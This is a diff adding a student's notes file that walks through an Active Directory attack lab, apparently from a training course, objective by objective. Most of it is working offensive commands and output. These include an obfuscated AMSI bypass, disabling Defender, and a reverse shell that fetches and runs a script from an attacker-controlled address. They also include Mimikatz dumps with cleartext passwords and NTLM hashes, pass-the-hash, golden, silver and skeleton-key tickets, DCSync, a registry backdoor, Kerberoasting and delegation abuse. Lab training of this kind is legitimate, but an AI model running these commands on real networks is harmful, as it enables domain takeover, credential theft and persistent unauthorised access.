@@ -1,0 +1,592 @@
+
+in moneycorp.local there is dollarcorp child domain, student is in user group, 
+srvadmin is local admin in other machine, svcadmin is domain admin
+PS C:\AD\Tools> . C:\AD\Tools\DAMP-master\\DAMP-master\RemoteHashRetrieval.ps1 - the ps script didnt work..
+ex 19 didnt final command on escalting to parent domain admin
+ex 20 didnt run the final command as enterprise admin
+
+
+--------------------------------------------------------------------------------------------------------
+
+Learning Objective 1
+• Enumerate following for the dollarcorp domain:
+ – Users 
+Get-NetUser
+– Computers
+Get-NetComputer
+ – Domain Administrators
+Get-NetGroup -GroupName "Domain Admins" -FullData
+or
+Get-NetGroupMember -groupName "Domain Admins"
+ – Enterprise Administrators
+Get-NetGroupMember -groupName "Enterprise Admins" -Domain moneycorp.local
+
+-revised
+Get-NetGroupMember -GroupName "Administrators" -Recurse 
+Get-NetGroup –UserName "student1" 
+Get-NetLocalGroup -ComputerName dcorpdc.dollarcorp.moneycorp.local -Recurse
+Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+
+--revised
+
+ – Shares
+Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
+-------------------------------------
+Learning Objective 2
+• Enumerate following for the dollarcorp domain: 
+– List all the OUs
+Get-NetOU
+or
+Get-NetOU -FullData 
+ – List all the computers in the StudentMachines OU. 
+Get-NetOU -OUName StudentMachines
+and 
+Get-NetOU -OUName StudentMachines | %{Get-NetComputer -ADSpath $_}
+– List the GPOs 
+Get-NetGPO
+– Enumerate GPO applied on the StudentMachines OU.
+(Get-NetOU StudentMachines -FullData).gplink
+and 
+Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local
+----------------
+Learning Objective 3
+• Enumerate following for the dollarcorp domain: 
+– ACL for the Users group 
+Get-ObjectAcl -SamAccountName "users" –ResolveGUIDs -verbose
+– ACL for the Domain Admins group
+Get-ObjectAcl -SamAccountName "Domain Admins" –ResolveGUIDs -verbose
+ – All modify rights/permissions for the studentx
+ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}  | ?{$_.IdentityReference -match "student"} 
+Nothing much here.  
+Now, to check for modify rights/permissions for the studentx or RDPUsers group, Invoke-ACLScanner can be used: 
+PS C:\AD\Tools> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student107"}  PS C:\AD\Tools> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
+-------------------------------
+Learning Objective 4
+• Enumerate all domains in the moneycorp.local forest. 
+ Get-NetForestDomain -Verbose 
+• Map the trusts of the dollarcorp.moneycorp.local domain. 
+Get-NetDomainTrust 
+• Map External trusts in moneycorp.local forest. 
+ Get-NetForestDomain -Verbose | Get-NetDomainTrust 
+or
+ Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'} 
+• Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest? 
+ Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}  
+Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust
+-----------------------------
+Learning Objective 5
+• Exploit a service on dcorp-studentx and elevate privileges to local 
+PS C:\AD\Tools> . C:\AD\Tools\PowerUp.ps1
+PS C:\AD\Tools> Invoke-AllChecks
+Invoke-ServiceAbuse -Name Abysswebserver -UserName dcorp\student107 -verbose
+
+• Identify a machine in the domain where studentx has local administrative access. 
+. c:\AD\Tools\PowerView.ps1
+Find-LocalAdminAccess -verbose
+dcorp-adminsrv.dollarcorp.moneycorp.local
+now powershell remoting using Enter-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
+• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
+. c:\AD\Tools\powercat.ps1
+>powercat -l -v -p 443 -t 1000
+powershell.exe iex (iwr http://172.16.100.107/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.107 -Port 443
+
+
+Learning Objective 6
+Setup BloodHound and identify a machine where studentx has local administrative access. 
+PS C:\AD\tools\BloodHound-master\BloodHound-master\Ingestors> . .\SharpHound.ps1 PS C:\AD\tools\BloodHound-master\BloodHound-master\Ingestors> InvokeBloodHound -CollectionMethod All -Verbose 
+
+Learning Objective 7
+Domain user on one of the machines has access to a server where a domain admin is logged in. 
+Identify: – The domain user – The server where the domain admin is logged in.
+starting from the jenkins machine user since there are no loggod on users where domain admin from student107
+------------------------
+
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+---------------------------
+
+ iex (iwr http://172.16.100.107/PowerView.ps1 -UseBasicParsing);
+PS C:\Program Files (x86)\Jenkins\workspace\Project13> Invoke-UserHunter -CheckAccess
+
+
+UserDomain      : dcorp
+UserName        : svcadmin
+ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
+IPAddress       : 172.16.4.44
+SessionFrom     :
+SessionFromName :
+LocalAdmin      : True
+
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+
+> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local 
+>  iex (iwr http://172.16.100.107/Invoke-Mimikatz.ps1 -UseBasicParsing);
+>Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess 
+>Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+--------------
+uthentication Id : 0 ; 65572 (00000000:00010024)
+ession           : Service from 0
+ser Name         : svcadmin
+omain            : dcorp
+ogon Server      : DCORP-DC
+ogon Time        : 4/19/2019 11:26:53 PM
+ID               : S-1-5-21-1874506631-3219952063-538504511-1122
+       msv :
+        [00000003] Primary
+        * Username : svcadmin
+        * Domain   : dcorp
+        * NTLM     : b38ff50264b74508085d82c69794a4d8
+        * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
+        * DPAPI    : fd3c6842994af6bd69814effeedc55d3
+       tspkg :
+       wdigest :
+        * Username : svcadmin
+        * Domain   : dcorp
+        * Password : (null)
+       kerberos :
+        * Username : svcadmin
+        * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+        * Password : *ThisisBlasphemyThisisMadness!!
+----------------------------
+in local powershell as admin type the below with pass the hash mimikatz
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"' 
+A new powershell will open use the below command
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+we can see we will be able to execute script in dcorp-dc as svcadmin
+-------------------------------------------------------------------------------------------------------------------------------
+• Escalate privileges to Domain Admin – Using the method above. – Using derivative local admin
+
+we have admin access on dcorp-adminsrv.dollarcorp.moneycorp.local
+now need to see who else has session in this machine
+Do remote PS to that machine and check the applocker policy
+
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
+we need to add mimikatz in program files since its allow to run scripts
+before that stop defender
+
+>Set-MpPreference -DisableRealtimeMonitoring $true -Verbose 
+
+PS C:\AD\Tools>  Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+
+we will get srvadmin on that machine who is a admin , use pth and that ntlm hash and then use invoke user hunter 
+then we will get svcadmin hash who is domain admin.
+
+>Set-MpPreference -DisableRealtimeMonitoring $true -Verbose 
+>. C:\AD\Tools\Invoke-Mimikatz.ps1
+Run as admin
+>Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+PS C:\Windows\system32>  powershell -ep bypass
+PS C:\Windows\system32> cd C:\AD\Tools\
+PS C:\AD\Tools>  . .\PowerView.ps1
+PS C:\AD\Tools>  Invoke-UserHunter -CheckAccess
+------------------------------------------
+UserDomain      : dcorp
+UserName        : svcadmin
+ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
+IPAddress       : 172.16.4.44
+SessionFrom     :
+SessionFromName :
+LocalAdmin      : True
+------------------------------------
+Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+iex (iwr http://172.16.100.107/Invoke-Mimikatz.ps1 -UseBasicParsing) 
+ Invoke-Mimikatz 
+ * Username : svcadmin
+         * Domain   : dcorp
+         * NTLM     : b38ff50264b74508085d82c69794a4d8
+-------------------------------------------------
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"
+The new PowerShell session which pops-up runs with domain admin privileges
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+---------------------------------------------------------------------------------------------
+Learning Objective 8
+• Dump hashes on the domain controller of dollarcorp.moneycorp.local. 
+powershell -ep bypass
+$sess = New-PSSession -ComputerName dcorp-dc
+Enter-PSSession $sess 
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+exit 
+ Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess 
+Enter-PSSession $sess 
+ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
+----------------------
+
+• Using the NTLM hash of krbtgt account, create a Golden ticket. 
+
+. C:\AD\Tools\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+• Use the Golden ticket to (once again) get domain admin privileges from a machine.
+PS C:\AD\Tools> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$ 
+
+Learning Objective 9
+• Try to get command execution on the domain controller by creating silver ticket for:
+ – HOST service
+we need NTLM hash of DC machine service account DCORP-DC$
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:93338bc40a6a4f75f91e8fed8bb0c16b /user:Administrator /ptt"'
+run schtasks /S dcorp-dc.dollarcorp.moneycorp.local to check if successfully created
+Run a SC task to get reverse shell
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User107" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.107/Invoke-PowerShellTcp.ps1''')'"  
+ schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User107" 
+– WMI
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt"' 
+Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+Learning Objective 10
+• Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack
+PS C:\AD\Tools\Tools> $sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local 
+ Enter-PSSession -Session $sess 
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+exit
+ Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess 
+ Enter-PSSession -Session $sess 
+after loading mimikatz in current session load the skelten key command injection
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+ Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator 
+use password as mimikatz
+----------------------------
+Learning Objective 11
+Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
+After loging in as domain admin svcadmin , now run the below ot get sam dump
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
+hash found of DSRM admin is 
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd
+
+ New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD 
+
+Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
+from local system use PTH 
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd  /run:powershell.exe"' 
+ls \\dcorp-dc.dollarcorp.moneycorp.local\c$ 
+----------------------------------------------------------------------------------
+Learning Objective 12: 
+Task 
+? Check if studentx has Replication (DCSync) rights. 
+PS C:\AD\Tools> . .\PowerView.ps1 
+PS C:\AD\Tools> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "student107") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))} 
+
+? If yes, execute the DCSync attack to pull hashes of the krbtgt user. 
+? If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user. 
+from domain admin shell
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"' 
+PS C:\AD\Tools> . .\PowerView.ps1 
+PS C:\AD\Tools> Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student107 -Rights DCSync -Verbose
+
+for normal shell cheeck again
+PS C:\AD\Tools> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "student107") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))} 
+
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
+-------------------------------------------------------------------------------
+Learning Objective 13
+• Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
+As domain admin run below commands
+
+PS C:\AD\Tools> . .\Set-RemoteWMI.ps1 or . C:\AD\Tools\Set-RemoteWMI.ps1
+PS C:\AD\Tools> Set-RemoteWMI -UserName student107 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose 
+
+Now run as student
+PS C:\AD\Tools> gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
+
+Similar modification can be done to PowerShell remoting configuration. 
+PS C:\AD\Tools> . .\Set-RemotePSRemoting.ps1 
+PS C:\AD\Tools> Set-RemotePSRemoting -UserName student107 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose 
+ ignore io errors.
+Now, we can run commands using PowerShell remoting on the DC without DA privileges:  
+ 
+PS C:\AD\Tools> Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+ 
+• Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
+To retrieve machine account hash without DA, first we need to modify permissions on the DC: 
+PS C:\AD\Tools> . C:\AD\Tools\DAMP-master\DAMP-master\Add-RemoteRegBackdoor.ps1 
+PS C:\AD\Tools> Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student107 -Verbose 
+Now, we can retreive hash as studentx: 
+PS C:\AD\Tools> . C:\AD\Tools\DAMP-master\\DAMP-master\RemoteHashRetrieval.ps1 
+PS C:\AD\Tools> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose 
+-----------------------------------------------------------------------------
+Learning Objective 14
+• Using the Kerberoast attack, crack password of a SQL server service account.
+We first need to find out services running with user accounts
+PS C:\AD\Tools> . .\PowerView.ps1 
+PS C:\AD\Tools> Get-NetUser -SPN 
+
+ Neat! The svcadmin, which is a domain administrator has a SPN set! Let’s request a ticket for the service: 
+PS C:\AD\Tools> Add-Type -AssemblyNAme System.IdentityModel 
+PS C:\AD\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" 
+Let’s check if we have the TGS for the service: 
+PS C:\AD\Tools> klist 
+
+Now, let’s dump the tickets to disk: 
+PS C:\AD\Tools> . .\Invoke-Mimikatz.ps1 
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::list /export"'
+Now, copy the the MSSQL ticket to the Kerberoast folder and offline crack the Service Account Password: 
+PS C:\AD\Tools> Copy-Item .\1-40a10000-student107@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi C:\AD\Tools\kerberoast\ 
+PS C:\AD\Tools> cd kerberoast 
+PS C:\AD\Tools\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-student107@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+ found password for ticket 0: *ThisisBlasphemyThisisMadness!!  File: .\140a10000-studentx@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.localDOLLARCORP.MONEYCORP.LOCAL.kirbi 
+All tickets cracked! 
+---------------------------------------------
+
+Learning Objective 15
+• Enumerate users that have Kerberos Preauth disabled. 
+PS C:\AD\Tools> . .\PowerView_dev.ps1 
+PS C:\AD\Tools> Get-DomainUser -PreauthNotRequired -Verbose
+• Obtain the encrypted part of AS-REP for such an account.
+Next, we can use Get-ASREPHash from ASREPRoast to request the crackable encrypted part (make sure you replace X with your userid): 
+ 
+PS C:\AD\Tools> . .\ASREPRoast\ASREPRoast.ps1 
+PS C:\AD\Tools> Get-ASREPHash -UserName VPN107user -Verbose 
+• Determine if studentx has permissions to set UserAccountControl flags for any user. 
+Now, let’s enumerate those users where studentx has GenericWrite or GenericAll rights. Since studentx is a part of the RDPUsers group: 
+PS C:\AD\Tools> . .\PowerView_dev.ps1
+ PS C:\AD\Tools> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} 
+• If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.
+Since RDPUsers has GenericAll rights over Control07user, let’s force set preauth not required to the ControlXUser’s useraccountcontrol settings: 
+ 
+PS C:\AD\Tools> Set-DomainObject -Identity Control107User -XOR @{useraccountcontrol=4194304} -Verbose 
+To check once more
+
+ PS C:\AD\Tools> Get-DomainUser -PreauthNotRequired -Identity Control07User 
+PS C:\AD\Tools> Get-ASREPHash -UserName Control107User -Verbose 
+
+Learning Objective 16
+• Determine if studentx has permissions to set UserAccountControl flags for any user. 
+PS C:\AD\Tools> . .\PowerView_dev.ps1
+ PS C:\AD\Tools> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} 
+• If yes, force set a SPN on the user and obtain a TGS for the user.
+Let’s check if support107user already has a SPN: 
+PS C:\AD\Tools> Get-DomainUser -Identity support107user | select serviceprincipalname   
+serviceprincipalname --------------------   
+Since studentX has GenericAll rights on the supportXuser, let’s force set a SPN on it:  
+ PS C:\AD\Tools> Set-DomainObject -Identity supportXuser -Set @{serviceprincipalname='dcorp/whateverX'} -Verbose
+Now, request a TGS for the SPN and save it for offline brute-force: 
+PS C:\AD\Tools> Add-Type -AssemblyName System.IdentityModel 
+PS C:\AD\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX"  
+ 
+-------------------------------------------------------------------
+Learning Objective 17- Privilege escaltion to domain admin using a server which has unconstrained delegeation
+• Find a server in dcorp domain where Unconstrained Delegation is enabled.
+PS C:\AD\Tools> Get-NetComputer -Unconstrained | select -ExpandProperty name  DCORP
+Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv
+PS C:\WINDOWS\system32> powershell -ep bypass
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"' 
+
+PS C:\Windows\system32> . C:\AD\Tools\PowerView.ps1
+PS C:\Windows\system32> Find-LocalAdminAccess dcorp-appsrv.dollarcorp.moneycorp.local
+dcorp-appsrv.dollarcorp.moneycorp.local
+Sweet! Now, let’s run following mimikatz command in the new PowerShell session running as appadmin to check if there is a Domain Admin ticket already present on it: 
+ 
+PS C:\Windows\system32> powershell -ep bypass
+PS C:\Windows\system32> $sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local 
+PS C:\AD\Tools> Enter-PSSession -Session $sess 
+----
+[dcorp-appsrv]: PS C:\Users\appadmin\Documents> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+
+[dcorp-appsrv]: PS C:\Users\appadmin\Documents> exit 
+ 
+PS C:\Windows\system32> Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess 
+PS C:\Windows\system32> Enter-PSSession -Session $sess 
+[dcorp-appsrv]: PS C:\Users\appadmin\Documents> 
+ 
+Create a userX directory where X is your userId to avoid overwriting tickets of other users: 
+[dcorp-appsrv]: PS C:\Users\appadmin\Documents> mkdir user107
+[dcorp-appsrv]: PS C:\Users\appadmin\Documents> cd .\user107
+[dcorp-appsrv]: PS C:\Users\appadmin\Documents\userX> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"' 
+[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user1> ls | select name 
+
+ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user107\[0;38e95f]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+
+ Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
+• Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.
+
+Learning Objective 18
+• Enumerate users in the domain for whom Constrained Delegation is enabled. – For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured. – Pass the ticket and access the service as DA.
+To enumerate users with constrained delegation we can use PowerView dev: 
+PS C:\AD\Tools> . .\PowerView_dev.ps1
+ PS C:\AD\Tools> Get-DomainUser -TrustedToAuth 
+PS C:\AD\Tools> cd .\kekeo 
+PS C:\AD\Tools\kekeo\x64> .\kekeo.exe 
+kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f 
+
+> Ticket in file 'TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.k
+irbi'
+
+Now, let’s use this TGT and request a TGS. Note that we are requesting a TGS to access cifs/dcorp-mssql as the domain administrator - Administrator: 
+
+kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL 
+
+  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.
+moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
+
+PS C:\AD\Tools\kekeo> . ..\Invoke-Mimikatz.ps1 
+PS C:\AD\Tools\kekeo\x64> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"' 
+ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
+
+ • Enumerate computer accounts in the domain for which Constrained Delegation is enabled. – For such a user, request a TGT from the DC. – Use the TGS for executing the DCSync attack. 
+ Get-DomainComputer -TrustedToAuth 
+We have the hash of adminsrv$ from dcorp-adminsrv machine. Let’s request a TGT. Please note that the hash may change in the lab: 
+kekeo # tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
+
+ > Ticket in file 'TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
+
+kekeo # tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL 
+
+  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorpdc.dollarcorp.moneycorp.LOCAL@DOLLA
+RCORP.MONEYCORP.LOCAL_ALT.kirbi'
+Now, using this TGS, we can use DCSync from mimikatz without DA privileges: 
+ 
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
+PS C:\AD\Tools\kekeo\x64> . ..\..\Invoke-Mimikatz.ps1 
+PS C:\AD\Tools\kekeo\x64> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorpdc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"' 
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
+
+Learning Objective 19
+• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key. 
+PS C:\WINDOWS\system32> powershell -ep bypass 
+PS C:\WINDOWS\system32> cd C:\AD\Tools\ 
+login as svcadmin with its hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"' 
+PS C:\AD\Tools> $sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
+PS C:\AD\Tools> Enter-PSSession -Session $sess
